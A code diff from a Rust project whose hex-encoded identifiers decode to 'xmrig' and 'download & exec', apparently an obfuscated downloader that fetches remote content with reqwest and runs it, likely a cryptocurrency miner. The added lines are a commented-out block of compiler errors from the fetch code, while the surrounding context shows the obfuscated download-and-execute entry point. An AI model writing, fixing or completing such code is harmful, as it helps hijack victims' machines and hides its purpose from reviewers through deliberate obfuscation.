@@ -6,6 +6,29 @@ pub fn main() {
     _0x646f776e6c6f616420262065786563();
 }
 
+
+
+
+/* // TODO: fix error
+error[E0599]: no method named `text` found for enum `Result` in the current scope
+  --> src/_0x786d726967/main.rs:21:53
+   |
+21 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
+   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`
+
+error[E0599]: no method named `text` found for enum `Result` in the current scope
+  --> src/_0x786d726967/main.rs:33:53
+   |
+33 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
+   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`
+
+error[E0599]: no method named `text` found for enum `Result` in the current scope
+  --> src/_0x786d726967/main.rs:45:53
+   |
+45 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
+   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`
+ */
+
 #[tokio::main]
 async fn _0x646f776e6c6f616420262065786563() -> Result<(), reqwest::Error> {
     if cfg!(unix) {
